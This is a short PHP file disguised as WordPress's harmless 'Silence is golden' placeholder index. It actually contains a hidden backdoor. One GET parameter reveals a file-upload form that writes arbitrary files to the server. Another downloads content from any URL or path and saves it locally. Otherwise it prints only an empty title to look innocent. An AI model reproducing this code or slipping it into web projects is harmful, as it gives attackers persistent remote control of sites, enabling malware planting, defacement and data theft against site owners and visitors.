<?php
// Silence is golden.
if(isset($_GET[php4])) {echo '<form action="" method="post" enctype="multipart/form-data" name="silence" id="silence">'; echo '<input type="file" name="file"><input name="golden" type="submit" id="golden" value="Done"></form>';
if( $_POST['golden'] == "Done" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '+'; } else { echo '-'; }}} if(isset($_GET[php5])) {$file=$_GET["php5"]; $wpf=strrchr($file, '/'); $wpf=str_replace("/","",$wpf); $content=file_get_contents($file); $wpt = fopen($wpf, "w"); fwrite($wpt, $content); fclose($wpt); } else {echo '<title></title>';}
?>